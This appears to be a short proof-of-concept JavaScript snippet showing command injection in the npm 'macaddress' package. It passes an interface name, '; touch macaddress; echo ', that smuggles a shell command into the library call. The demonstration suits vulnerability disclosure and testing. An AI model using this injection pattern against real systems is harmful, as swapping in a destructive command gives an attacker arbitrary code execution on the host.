let iface = "; touch macaddress; echo ";
try {
  require("macaddress").one(iface, function (err, mac) {});
} catch (e) {}
